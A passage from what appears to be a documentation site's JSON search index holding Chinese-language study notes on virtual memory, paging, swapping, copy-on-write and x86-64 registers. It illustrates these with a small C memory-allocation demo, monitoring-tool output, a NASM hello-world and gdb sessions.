u7684\u6570\u636e\uff1b\u5185\u5b58\u4f7f\u7528\u6548\u7387\u4f4e\uff0c\u6bd4\u5982\u5f53\u524d\u6b63\u5728\u8fd0\u884cA\u548cB\uff0c\u8fd9\u65f6\u5019\u9700\u8981\u8fd0\u884cC\u4f46\u5185\u5b58\u4e0d\u591f\uff0c\u5c31\u9700\u8981\u628a\u6574\u4e2aA\u6216B\u6362\u51fa\u5230\u786c\u76d8\u518d\u8f7d\u5165C\uff1b\u7a0b\u5e8f\u8fd0\u884c\u7684\u5730\u5740\u4e0d\u786e\u5b9a\uff0c\u7ed9\u7a0b\u5e8f\u7684\u7f16\u5199\u9020\u6210\u4e86\u4e00\u5b9a\u7684\u9ebb\u70e6\u3002  </p> <p>\u7136\u540e\u5f15\u5165\u4e86\u865a\u62df\u5185\u5b58\uff0c\u4eba\u4eec\u5f00\u59cb\u4f7f\u7528\u4e00\u79cd\u5206\u6bb5(Segmention)\u7684\u65b9\u6cd5\uff0c\u628a\u4e00\u6bb5\u7a0b\u5e8f\u9700\u8981\u7684\u5185\u5b58\u5927\u5c0f\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\u6620\u5c04\u5230\u7269\u7406\u5730\u5740\u7a7a\u95f4\uff0c\u7531\u64cd\u4f5c\u7cfb\u7edf\u548c\u786c\u4ef6\u6765\u5b8c\u6210\u5b83\u4eec\u4e4b\u95f4\u7684\u76f8\u4e92\u8f6c\u6362\u3002\u8fd9\u6837\u89e3\u51b3\u4e86\u6ca1\u6709\u865a\u62df\u5185\u5b58\u65f6\u7684\u5730\u5740\u7a7a\u95f4\u4e0d\u9694\u79bb\u548c\u7a0b\u5e8f\u8fd0\u884c\u5730\u5740\u4e0d\u786e\u5b9a\u7684\u95ee\u9898\uff0c\u4f46\u5bf9\u4e8e\u5185\u5b58\u6548\u7387\u7684\u95ee\u9898\u4f9d\u7136\u6ca1\u6709\u89e3\u51b3\u3002</p> <p>\u56e0\u6b64\uff0c\u73b0\u5728\u90fd\u4f7f\u7528\u5206\u9875(Paging)\u7684\u65b9\u6cd5\u3002\u628a\u5730\u5740\u7a7a\u95f4\u4eba\u4e3a\u5730\u5206\u6210\u56fa\u5b9a\u5927\u5c0f\u7684\u9875\uff0c\u9875\u7684\u5927\u5c0f\u7531\u64cd\u4f5c\u7cfb\u7edf\u548c\u786c\u4ef6\u51b3\u5b9a\u3002\u5f53\u6211\u4eec\u628a\u8fdb\u7a0b\u7684\u865a\u62df\u5730\u5740\u6309\u9875\u5206\u5272\u65f6\uff0c\u4f1a\u628a\u5e38\u7528\u7684\u6570\u636e\u9875\u548c\u4ee3\u7801\u9875\u88c5\u8f7d\u5230\u5185\u5b58\u4e2d\uff0c\u628a\u4e0d\u5e38\u7528\u7684\u4ee3\u7801\u548c\u6570\u636e\u4fdd\u5b58\u5728\u786c\u76d8\u91cc\uff0c\u9700\u8981\u7528\u5230\u65f6\u518d\u4ece\u786c\u76d8\u4e2d\u53d6\u51fa:</p> <p></p> <p>\u5982\u56fe\u6240\u793a\uff0cDP\u8868\u793a\u78c1\u76d8\u9875\uff0cVP\u8868\u793a\u865a\u62df\u9875\uff0cPP\u8868\u793a\u7269\u7406\u9875\u3002\u865a\u62df\u7a7a\u95f4\u4e2d\u6709\u7684\u9875\u88ab\u6620\u5c04\u5230\u540c\u4e00\u4e2a\u7269\u7406\u9875\u4e2d\uff0c\u4ece\u800c\u5b9e\u73b0\u4e86\u5185\u5b58\u5171\u4eab\u3002\u6b64\u5916\uff0c\u53ef\u4ee5\u7ed9\u6bcf\u4e2a\u9875\u8bbe\u7f6e\u6743\u9650\u5c5e\u6027\uff0c\u505a\u5230\u4e00\u4e2a\u57fa\u7840\u7684\u4fdd\u62a4\u3002</p>"},{"location":"sicp/software/#_17","title":"\u5185\u5b58\u5206\u914d\u8fc7\u7a0b","text":"<p>\u5047\u8bbe\u67d0\u4e2a\u7a0b\u5e8f\u9700\u8981\u5185\u5b58\u5206\u914d\u5668\u5206\u914d10MB\u7684\u5185\u5b58\uff0c\u90a3\u4e48\u64cd\u4f5c\u7cfb\u7edf\u4f1a\u600e\u4e48\u505a\u5462\uff1f\u9996\u5148\u4f1a\u5212\u5206\u51fa\u4e00\u4e2a\u865a\u62df\u5730\u5740\u8303\u56f4\uff0c\u7136\u540e\u8fd4\u56de\u8d77\u59cb\u5730\u5740\u7684\u6307\u9488\u3002\u5b83\u6b64\u65f6\u6ca1\u6709\u5fc5\u8981\u901a\u8fc7MMU\u5206\u914d\u771f\u5b9e\u7684\u7269\u7406\u5185\u5b58\uff0c\u56e0\u4e3a\u6709\u53ef\u80fd\u8fd9\u6bb5\u5185\u5b58\u540e\u7eed\u6839\u672c\u6ca1\u6709\u8bfb\u5199\u53d1\u751f\u3002\u63a5\u4e0b\u6765\u82e5\u5199\u5165\u6570\u636e\uff0c\u4e5f\u53ea\u4f1a\u4ee5\u9875(8KB)\u4e3a\u5355\u4f4d\u4e00\u70b9\u70b9\u7684\u53bb\u5199\uff0c\u6bcf\u6b21\u5199\u5165\u7684\u65f6\u5019\u64cd\u4f5c\u7cfb\u7edf\u518d\u53bb\u8865\u7269\u7406\u5185\u5b58\uff0c\u91c7\u7528\u4e00\u79cd\u200b\u6309\u9700\u5206\u914d\u7684\u673a\u4f1a\u4e3b\u4e49\u539f\u5219\u3002\u5177\u4f53\u5982\u4f55\u5b9e\u73b0\u5462\uff1f\u5f53\u5411\u4e00\u4e2a\u865a\u62df\u5730\u5740\u5199\u5165\u6570\u636e\u65f6\uff0c\u5c31\u4f1a\u53bbMMU\u627e\u5bf9\u5e94\u7684\u7269\u7406\u5730\u5740\uff0c\u6ca1\u6709\u627e\u5230\u5c31\u8bf4\u660e\u6ca1\u6709\u5efa\u7acb\u6620\u5c04\u5173\u7cfb\u8fd8\u6ca1\u6709\u5206\u914d\u7269\u7406\u5185\u5b58\uff0c\u5c31\u4f1a\u5f15\u53d1\u4e00\u4e2a\u200b\u7f3a\u9875\u5f02\u5e38(page fault)\uff0c\u64cd\u4f5c\u7cfb\u7edf\u5185\u6709\u4e13\u95e8\u7684\u7a0b\u5e8f\u628a\u8fd9\u4e00\u9875\u8865\u4e0a\uff0c\u6765\u5b9e\u73b0\u6309\u9700\u5206\u914d\u3002</p> <p>\u6211\u4eec\u901a\u8fc7\u7a0b\u5e8f\u53ef\u4ee5\u6a21\u62df\u8fd9\u79cd\u865a\u62df\u5185\u5b58\u548c\u7269\u7406\u5185\u5b58\u7684\u5173\u7cfb: <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n// gcc -g -O0 -o test test.c\n// ./test\nint main()\n{\n    const size_t length = 1024 * 1024 * 100;\n    const size_t pause = length / 10;\n    unsigned char *p = malloc(length); // \u5206\u914d100MB\u5185\u5b58\n    unsigned char *x = p;\n    for (int i = 0; i &lt; (int)length; i++) // \u5faa\u73af\u5199\u5165\u6570\u636e\n    {\n        *x = 1;\n        x++;\n        if (i % (int)pause == 0) // \u9694\u4e00\u6bb5\u65f6\u95f4\u6682\u505c\u4e00\u4e0b\u4fbf\u4e8e\u89c2\u5bdf\n        {\n            printf(\"%d\\n\", i);\n            getchar();          // \u53ef\u4ee5\u8ba9\u7528\u6237\u5728\u547d\u4ee4\u884c\u4e2d\u968f\u65f6\u63a7\u5236\u8fd0\u884c\u8fdb\u5ea6\n        }\n    }\n    free(p);\n    return EXIT_SUCCESS;\n}\n</code></pre></p> <p>\u89c2\u5bdf\u8fd0\u884c\u7ed3\u679c: <pre><code>[ubuntu] ~/.mac $ pidstat -r -p `pidof test` 1\n\u2502Linux 4.9.184-linuxkit (cabd4e519687)   12/06/19        _x86_64_        (2 CPU)\u2502\n\u250211:10:18      UID       PID  minflt/s  majflt/s     VSZ     RSS   %MEM  Command\n\u250211:10:19        0       180      0.00      0.00  106908   21624   1.06  test\n\u250211:10:20        0       180      0.00      0.00  106908   21624   1.06  test\n\u250211:10:21        0       180      0.00      0.00  106908   21624   1.06  test\n\u250211:10:22        0       180   2560.00      0.00  106908   31920   1.56  test\n\u250211:10:23        0       180      0.00      0.00  106908   31920   1.56  test\n\u250211:10:24        0       180   2534.65      0.00  106908   42216   2.06  test\n\u250211:10:25        0       180      0.00      0.00  106908   42216   2.06  test\n\u250211:10:26        0       180   2560.00      0.00  106908   52512   2.57  test\n\u250211:10:27        0       180      0.00      0.00  106908   52512   2.57  test\n\u250211:10:28        0       180      0.00      0.00  106908   52512   2.57  test\n\u250211:10:29        0       180      0.00      0.00  106908   52512   2.57  test\n\u250211:10:30        0       180   2560.00      0.00  106908   62544   3.06  test\n</code></pre> minflt/s\u8868\u793a\u6bcf\u79d2\u5206\u914d\u7684\u5185\u5b58\u5757\uff0cmajflt/s\u8868\u793a\u4e0d\u6b62\u5206\u914d\u5185\u5b58\u5757\u8fd8\u8981\u628a\u6570\u636e\u4ece\u78c1\u76d8\u4e0a\u88c5\u8f7d\u56de\u6765\uff0cVSZ\u8868\u793a\u865a\u62df\u5185\u5b58\uff0cRSS\u8868\u793a\u7269\u7406\u5185\u5b58\uff0c%MEM\u8868\u793a\u7269\u7406\u5185\u5b58\u5360\u603b\u5185\u5b58\u7684\u767e\u5206\u6bd4\u3002\u53ef\u4ee5\u770b\u5230\u968f\u7528\u6237\u7684\u63a7\u5236\uff0c\u6570\u636e\u4e0d\u65ad\u5199\u5165\uff0c\u7269\u7406\u5185\u5b58\u589e\u52a0\u3002</p> <p>\u6b64\u5916\uff0c\u8fd8\u53ef\u4ee5\u8fd9\u6837\u89c2\u5bdf\u8fdb\u7a0b\u7684\u4e00\u4e9b\u4fe1\u606f: <pre><code>$ cat /proc/{pid}/status\n\nVmPeak:     4760 kB             ; \u6240\u4f7f\u7528\u865a\u62df\u5185\u5b58\u5cf0\u503c\nVmSize:     4760 kB             ; \u5f53\u524d\u4f7f\u7528\u7684\u865a\u62df\u5185\u5b58\nVmLck:         0 kB             ; \u5df2\u7ecf\u9501\u4f4f\u7269\u7406\u5185\u5b58\uff08\u4e0d\u80fd\u4ea4\u6362\u5230\u786c\u76d8\uff09\nVmHWM:      3864 kB             ; \u6240\u4f7f\u7528\u7269\u7406\u5185\u5b58\u5cf0\u503c\nVmRSS:       876 kB             ; \u5f53\u524d\u4f7f\u7528\u7684\u7269\u7406\u5185\u5b58\n\nVmData:      732 kB             ; \u6570\u636e\u6bb5\nVmStk:       132 kB             ; \u6808\nVmExe:       484 kB             ; \u4ee3\u7801\u6bb5\nVmLib:      2016 kB             ; \u52a0\u8f7d\u7684\u52a8\u6001\u5e93\uff08\u53ef\u80fd\u4e0e\u5176\u4ed6\u8fdb\u7a0b\u5171\u4eab\uff09\nVmPTE:        48 kB             ; \u9875\u8868\nVmSwap:      112 kB             ; \u6240\u4f7f\u7528\u4ea4\u6362\u533a\u5927\u5c0f\n\nvoluntary_ctxt_switches:  3543  ; \u4e3b\u52a8\u4e0a\u4e0b\u6587\u5207\u6362\u6b21\u6570\uff08IO\uff09\nnonvoluntary_ctxt_switches: 64  ; \u5f3a\u5236\u4e0a\u4e0b\u6587\u5207\u6362\u6b21\u6570\uff08time slice\uff09\n</code></pre></p>"},{"location":"sicp/software/#_18","title":"\u6362\u5165\u6362\u51fa","text":"<p>\u5047\u8bbe\u8fd910MB\u5185\u5b58\u5df2\u7ecf\u5206\u914d\u4e0b\u6765\uff0c\u8be5\u7a0b\u5e8f\u5374\u957f\u65f6\u95f4\u4e0d\u7528\uff0c\u64cd\u4f5c\u7cfb\u7edf\u5c31\u4f1a\u628a\u8fd910MB\u5185\u5b58\u7684\u6570\u636e\u4fdd\u5b58\u5230\u786c\u76d8\u7684\u4ea4\u6362\u5206\u533a\u4e0a\uff0c\u5e76\u5bf9\u8fd9\u4e9b\u5185\u5b58\u9875\u7684\u72b6\u6001\u505a\u53d8\u66f4\uff0cMMU\u7684\u6620\u5c04\u5730\u5740\u505a\u53d8\u66f4\uff0c\u8fd9\u4e9b\u5185\u5b58\u5c31\u53ef\u4ee5\u53bb\u7ed9\u522b\u7684\u7a0b\u5e8f\u7528\uff0c\u8fd9\u5c31\u53eb\u200b\u6362\u51fa\u200b(swap out)\u3002\u4e0b\u6b21\u91cd\u65b0\u6fc0\u6d3b\u8be5\u7a0b\u5e8f\u65f6\uff0c\u4f1a\u628a\u786c\u76d8\u4e0a\u4ea4\u6362\u5206\u533a\u7684\u6570\u636e\u91cd\u65b0\u653e\u56de\u67d0\u4e9b\u7a7a\u95f2\u7684\u9875\u5e76\u91cd\u65b0\u5efa\u7acb\u6620\u5c04\uff0c\u8fd9\u5c31\u662f\u200b\u6362\u5165\u200b(swap in)\u3002\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u76d1\u63a7\u5de5\u5177\u89c2\u5bdf\u5230\u7cfb\u7edf\u5185\u7684\u6362\u5165\u6362\u51fa\u60c5\u51b5: <pre><code>[ubuntu] ~ $ dstat\nYou did not select any stats, using -cdngy by default.\n--total-cpu-usage-- -dsk/total- -net/total- ---paging-- ---system--\nusr sys idl wai stl| read  writ| recv  send|  in   out | int   csw\n  3   4  77  16   0|  12M  101k|   0     0 |   0     0 |1464  2562\n  0   0 100   0   0|   0     0 |   0     0 |   0     0 | 175   408\n  0   0 100   0   0|   0     0 |   0     0 |   0     0 | 148   345\n  0   0 100   0   0|   0     0 |   0     0 |   0     0 | 143   341\n\n  // paging\u7684in\u548cout\u5373\u4e3a\u5f53\u524d\u6362\u5165\u6362\u51fa\u5927\u5c0f,int\u8868\u793a\u5f53\u524d\u6709\u591a\u5c11\u4e2d\u65ad,csw\u8868\u793a\u5f53\u524d\u6709\u591a\u5c11\u4e0a\u4e0b\u6587\u5207\u6362\n</code></pre> \u5f53\u7a0b\u5e8f\u8fd0\u884c\u9700\u8981\u7684\u5185\u5b58\u5927\u4e8e\u673a\u5668\u7684\u7269\u7406\u5185\u5b58\u65f6\uff0c\u5c31\u53ef\u80fd\u9020\u6210\u9891\u7e41\u7684\u6362\u5165\u6362\u51fa\uff0c\u4ea7\u751f\u200b\u98a0\u7c38\u6548\u5e94(thrashing)\u3002</p>"},{"location":"sicp/software/#_19","title":"\u6027\u80fd\u76f8\u5173","text":"<p>\u5982\u679c\u7a0b\u5e8f\u9700\u8981\u6027\u80fd\u66f4\u9ad8\u3001\u901f\u5ea6\u8981\u6709\u4fdd\u969c\uff0c\u5c31\u9700\u8981\u5411\u64cd\u4f5c\u7cfb\u7edf\u7533\u8bf7\u9501\u6b7b\u8fd9\u6bb5\u5185\u5b58\u3002\u540c\u65f6\uff0c\u7f3a\u9875\u5f02\u5e38\u5c5e\u4e8e\u5185\u6838\u7ea7\u522b\u7684\uff0c\u6709\u4e00\u5b9a\u7684\u5f00\u9500\uff0c\u6240\u4ee5\u4e3a\u4e86\u8ffd\u6c42\u6027\u80fd\u7684\u6781\u81f4\uff0c\u6709\u7684C\u7a0b\u5e8f\u4f1a\u5148\u8fdb\u884c\u4e00\u4e2a\u521d\u59cb\u5316\u64cd\u4f5c\uff0c\u7f3a\u9875\u5f02\u5e38\u4ecd\u7136\u4f1a\u6709\u53ea\u662f\u4f1a\u63d0\u524d\uff0c\u5728\u6267\u884c\u5177\u4f53\u7684\u7b97\u6cd5\u65f6\u5c31\u4f1a\u66f4\u9ad8\u6548\u4e0d\u53d7\u7f3a\u9875\u5f02\u5e38\u7684\u5f71\u54cd\uff0c\u800c\u4e00\u4e9b\u9ad8\u7ea7\u8bed\u8a00\u53ef\u80fd\u4f1a\u7531\u4e8e\u7f16\u8bd1\u5668\u7684\u4f18\u5316\u4f7f\u5f97\u63d0\u524d\u521d\u59cb\u5316\u5199\u5165\u88ab\u4f18\u5316\u5ffd\u7565\u6389\u3002</p> <p>\u7269\u7406\u5185\u5b58\u5206\u914d\u8fd8\u91c7\u7528\u4e86\u200b\u5199\u5165\u65f6\u590d\u5236\u200b\u200b\u200b(copy-on-write)\u7684\u673a\u5236\uff0c\u5373A\u82e5\u5f15\u7528\u4e00\u5757\u5185\u5b58\uff0c\u90a3\u4e48\u590d\u5236A\u5230B\u7684\u65f6\u5019\u5e76\u4e0d\u4f1a\u590d\u5236\u8fd9\u5757\u5185\u5b58\uff0c\u53ea\u6709\u5f53\u53bb\u5199\u5165A\u6216B\u7684\u65f6\u5019\u624d\u4f1a\u53bb\u590d\u5236\u8fd9\u5757\u5185\u5b58\uff0c\u8d77\u5230\u8282\u7ea6\u5185\u5b58\u7684\u76ee\u7684\u3002</p> <p>\u5bf9\u4e8e\u670d\u52a1\u5668\u6765\u8bb2\uff0c\u5047\u8bbe\u7269\u7406\u5185\u5b58\u67098G\uff0c\u5f53\u524d\u8fd0\u884c\u7684\u7a0b\u5e8f\u53ea\u67094G\uff0c\u64cd\u4f5c\u7cfb\u7edf\u5c31\u4f1a\u62ff\u53e6\u59164G\u5f53\u505a\u81ea\u5df1\u7684cache\u7528\uff0c\u6bd4\u5982\u7f13\u5b58\u6587\u4ef6\u8bfb\u5199\u7b49\uff0c\u7a0b\u5e8f\u9700\u8981\u4f7f\u7528\u65f6\u518d\u4ececache\u91cc\u8fd8\u56de\u6765\u3002\u4f46\u5bf9\u4e8e\u684c\u9762\u7aef\u7528\u6237\u6765\u8bb2\uff0cGUI\u7a0b\u5e8f\u5c45\u591a\uff0c\u5360\u7528\u5185\u5b58\u4e5f\u591a\uff0c\u6240\u4ee5\u5f80\u5f80\u4f1a\u6709\u8db3\u591f\u7684\u5185\u5b58\u6765\u8ba9\u7528\u6237\u8f7d\u5165\u4e00\u4e2a\u7a0b\u5e8f\u7684\u901f\u5ea6\u66f4\u5feb\u3002\u670d\u52a1\u5668\u5f80\u5f80\u8fd0\u884c\u7684\u7a0b\u5e8f\u6570\u91cf\u548c\u65f6\u95f4\u66f4\u957f\u66f4\u7a33\u5b9a\uff0c\u6240\u4ee5\u4e0d\u540c\u64cd\u4f5c\u7cfb\u7edf\u7684\u5206\u914d\u5185\u5b58\u7b56\u7565\u4e5f\u4e0d\u540c\u3002</p> <p>\u67d0\u79cd\u89d2\u5ea6\u4e0a\uff0c\u5047\u8bbe\u6240\u6709\u6570\u636e\u90fd\u4ea4\u6362\u5230\u786c\u76d8\u4e0a\uff0c\u6211\u4eec\u53ef\u4ee5\u8ba4\u4e3a\u6240\u6709\u7684\u6570\u636e\u4fdd\u5b58\u5728\u786c\u76d8\u4e0a\uff0c\u5185\u5b58\u4e0a\u53ea\u4fdd\u5b58\u6d3b\u8dc3\u6570\u636e\uff0c\u200b\u5185\u5b58\u53ef\u4ee5\u770b\u6210\u662f\u786c\u76d8\u7684\u7f13\u5b58\u200b\u6216\u8005\u8bf4L4\uff0c\u865a\u62df\u5b58\u50a8\u5668\u5c31\u53ef\u4ee5\u770b\u6210\u786c\u76d8\u4e0a\u4e00\u4e2a\u5de8\u5927\u7684\u6570\u7ec4\u3002</p> <p>\u603b\u7ed3\u6765\u8bf4\uff0c\u865a\u62df\u5b58\u50a8\u5668\u4e3b\u8981\u6709\u4ee5\u4e0b\u4f18\u70b9:</p> <ul> <li>\u5c06\u5185\u5b58\u5bf9\u5e94\u5230\u78c1\u76d8\u5b58\u50a8\u5668\uff0c\u4e3b\u5b58\u53ea\u4fdd\u7559\u6d3b\u52a8\u533a\u57df\u3002\uff08linux\u4e0b\u7684swap, windows\u4e0b\u7684pagefile.sys\uff09</li> <li>\u4e3a\u6bcf\u4e2a\u8fdb\u7a0b\u63d0\u4f9b\u4e00\u81f4\u7684\u5730\u5740\u7a7a\u95f4\uff0c\u7b80\u5316\u5185\u5b58\u7ba1\u7406\u3002\uff08\u94fe\u63a5\u5668\u53ef\u4ee5\u63d0\u524d\u5b89\u6392\u5730\u5740\uff09</li> <li>\u65e0\u6cd5\u8bbf\u95ee\u7269\u7406\u5730\u5740\uff0c\u9694\u79bb\u8fdb\u7a0b\u6570\u636e\u786e\u4fdd\u4e0d\u88ab\u7834\u574f\u3002</li> </ul>"},{"location":"sicp/software/#_20","title":"\u5bc4\u5b58\u5668","text":"<p>\u7531\u4e8e\u5bc4\u5b58\u5668\u6570\u91cf\u5f88\u5c11\uff0c\u6211\u4eec\u5c31\u7ed9\u6bcf\u4e2a\u5bc4\u5b58\u5668\u8d77\u4e86\u4e2a\u540d\u5b57\uff0c\u5e76\u5206\u4e3a:</p> <ul> <li>\u901a\u7528\u5bc4\u5b58\u5668:AX,BX,CX,DX,SI,DI,SP,BP,R8-R15</li> <li>\u6307\u4ee4\u5bc4\u5b58\u5668:IP(\u4e5f\u53ebPC)\uff0c\u7528\u4e8e\u8bfb\u53d6\u7a0b\u5e8f\u6267\u884c\u7684\u4e0b\u4e00\u6761\u6307\u4ee4\u5730\u5740</li> <li>\u6807\u5fd7\u5bc4\u5b58\u5668:FR\uff0c\u7528\u4e8e\u5b58\u653e\u5904\u7406\u5668\u7684\u72b6\u6001\u548c\u8fd0\u7b97\u7ed3\u679c</li> </ul>"},{"location":"sicp/software/#_21","title":"\u901a\u7528\u5bc4\u5b58\u5668","text":"<p>\u6211\u4eec\u5728\u5bc4\u5b58\u5668\u540d\u79f0\u524d\u52a0\u4e2aR\uff0c\u8868\u793a64\u4f4d\u7684\u5bc4\u5b58\u5668\uff1b\u52a0\u4e2aE\uff0c\u8868\u793a32\u4f4d\u7684\uff1b\u4e0d\u52a0\u8868\u793a16\u4f4d\u7684\uff1b\u540c\u65f6AH\u8868\u793aAX\u7684\u9ad8\u4f4d\uff1bAL\u8868\u793aAX\u7684\u5730\u4f4d\u3002\u53ef\u4ee5\u901a\u8fc7gdb\u89c2\u5bdf\u5230\u8fd9\u4e9b\u5bc4\u5b58\u5668\u7684\u503c\u3002</p> <pre><code>(gdb) info registers\nrax            0x66 102\nrbx            0x0  0\nrcx            0x22 34\nrdx            0x33 51\nrsi            0x22 34\nrdi            0x11 17\nrbp            0x7fffffffe580   0x7fffffffe580\nrsp            0x7fffffffe550   0x7fffffffe550\nr8             0x7ffff7dd0d80   140737351847296\nr9             0x7ffff7dd0d80   140737351847296\nr10            0x0  0\nr11            0x0  0\nr12            0x555555554540   93824992232768\nr13            0x7fffffffe660   140737488348768\nr14            0x0  0\nr15            0x0  0\nrip            0x5555555546b2   0x5555555546b2 &lt;main+68&gt;\neflags         0x206    [ PF IF ]\ncs             0x33 51\nss             0x2b 43\nds             0x0  0\nes             0x0  0\nfs             0x0  0\ngs             0x0  0\n(gdb) set $rbx=0x8070605040302010\n(gdb) p/x $ebx\n$1 = 0x40302010\n(gdb) p/x $bx\n$2 = 0x2010\n(gdb) p/x $bh\n$3 = 0x20\n(gdb) p/x $bl\n$4 = 0x10\n</code></pre> <p>\u6240\u4ee5\u6709\u4e86\u8fd9\u4e9b\u8bbf\u95ee\u7684\u624b\u6bb5\uff0c\u4e00\u4e2a\u5bc4\u5b58\u5668\u662f\u53ef\u4ee5\u5206\u5272\u4e3a\u4e0d\u540c\u7684\u90e8\u5206\uff0c\u5b58\u50a8\u4e0d\u540c\u5185\u5bb9\u7684\u3002\u901a\u7528\u5bc4\u5b58\u5668\u7528\u6765\u5b58\u4ec0\u4e48\u90fd\u53ef\u4ee5\uff0c\u53ea\u662f\u7531\u4e8eC\u8bed\u8a00\u51fa\u73b0\u7684\u65e9\uff0c\u5b83\u5bf9\u5404\u4e2a\u5bc4\u5b58\u5668\u7684\u4e00\u4e9b\u7528\u6cd5\u5c31\u6210\u4e86\u7ea6\u5b9a\u4fd7\u6210\u7684\u60ef\u4f8b\uff0c\u4f8b\u5982si\u3001di\u7528\u6765\u4f20\u53c2\uff0cax\u4fdd\u5b58\u8fd4\u56de\u503c\uff0cbp\u3001sp\u8868\u793a\u6808\u5e95\u3001\u6808\u9876\uff0ccx\u7528\u6765\u505a\u5faa\u73af\u7b49\u90fd\u662f\u60ef\u4f8b\u3002</p> <p>\u4f46\u6307\u4ee4\u5bc4\u5b58\u5668\u662f\u5728\u786c\u4ef6\u5c42\u9762\u4e0a\u548c\u5176\u4ed6\u5bc4\u5b58\u5668\u6709\u4e0d\u540c\uff0c\u4e13\u95e8\u7528\u6765\u653e\u7a0b\u5e8f\u6267\u884c\u7684\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u3002</p>"},{"location":"sicp/software/#_22","title":"\u6807\u5fd7\u5bc4\u5b58\u5668","text":"<p>\u6211\u4eec\u901a\u8fc7\u4e00\u4e2a\u793a\u4f8b\u4ee3\u7801\u6765\u89c2\u5bdf\u6807\u5fd7\u5bc4\u5b58\u5668\u7684\u7528\u9014\u3002</p> <pre><code>global _start\n\nsection .data\n    hello   : db `hello,world!\\n`\n\nsection .text\n\n    _start:\n        mov     rax, 1\n        test    rax, rax ; \u5982\u679cAX\u4e3a0\uff0c\u5219\u628aZF\u8bbe\u4e3a1\uff0c\u5426\u5219\u628aZF\u8bbe\u4e3a0\n        jne     .exit    ; \u5982\u679cZF\u4e3a0\uff0c\u5219\u8df3\u8f6c\u81f3.exit\u6807\u7b7e\n\n    .hello:\n        mov     rax, 1\n        mov     rdi, 1\n        mov     rsi, hello\n        mov     rdx, 14\n        syscall\n\n    .exit:\n        mov     rax, 60\n        xor     rdi, rdi\n        syscall\n</code></pre> <p>\u6807\u5fd7\u5bc4\u5b58\u5668\u6709\u5f88\u591a\u4e2a\u4f4d\uff0cZF\u5c31\u662f\u5176\u4e2d\u7684\u4e00\u4e2a\u4f4d\u3002\u54ea\u4e2a\u6307\u4ee4\u5bf9\u54ea\u4e2a\u6807\u5fd7\u4f4d\u6709\u5f71\u54cd\uff0c\u90fd\u6709\u624b\u518c\u53ef\u4ee5\u67e5\u5230\uff0c\u4f8b\u5982test\u6307\u4ee4\u53ef\u4ee5\u901a\u8fc7\u8fd9\u91cc\u67e5\u5230\uff0cjne\u4e5f\u662f\u3002</p> <p>\u63a5\u7740\uff0c\u6211\u4eec\u5728gdb\u4e2d\u89c2\u5bdf: <pre><code>[ubuntu] ~/.mac/assem $ nasm -g -F dwarf -f elf64 -o fr.o fr.s\n[ubuntu] ~/.mac/assem $ ld -o fr fr.o\n[ubuntu] ~/.mac/assem $ gdb fr\n...\n(gdb) b 9\nBreakpoint 1 at 0x4000b0: file fr.s, line 9.\n(gdb) r\nStarting program: /root/.mac/assem/fr\n\nBreakpoint 1, _start () at fr.s:9\n9           mov     rax, 1\n(gdb) display $rax\n1: $rax = 0\n(gdb) display $eflags\n2: $eflags = [ IF ]\n(gdb) n\n10          test    rax, rax ; ZF=1 if AX==0 else ZF=0\n1: $rax = 1\n2: $eflags = [ IF ]\n(gdb) n\n11          jne     .exit    ; jmp if ZF==0\n1: $rax = 1\n2: $eflags = [ IF ]\n(gdb) n\n_start.exit () at fr.s:21\n21          mov     rax, 60\n</code></pre></p> <p>\u6807\u5fd7\u5bc4\u5b58\u5668\u4e2d\u82e5\u67d0\u4f4d\u6709\u503c\u5219\u4f1a\u51fa\u73b0\u5728eflags\u4e2d\uff0c\u6309\u5f53\u524d\u4ee3\u7801\u903b\u8f91\uff0cZF\u4e3a0\u4f1a\u76f4\u63a5\u8df3\u8f6c\u5230<code>.exit</code>\u90e8\u5206\u3002\u7136\u540e\u6211\u4eec\u5728gdb\u4e2d\u4fee\u6539<code>$rax</code>\u7684\u503c\uff0c\u4f1a\u53d1\u73b0\u8df3\u8f6c\u81f3<code>.hello</code>\u90e8\u5206\u3002</p> <pre><code>(gdb) n\n10          test    rax, rax ; ZF=1 if AX==0 else ZF=0\n1: $rax = 1\n2: $eflags = [ IF ]\n(gdb) set $rax=0\n(gdb) n\n11          jne     .exit    ; jmp if ZF==0\n1: $rax = 0\n2: $eflags = [ PF ZF IF ]\n(gdb) n\n_start.hello () at fr.s:14\n14          mov     rax, 1\n1: $rax = 0\n2: $eflags = [ PF ZF IF ]\n</code></pre>"}]}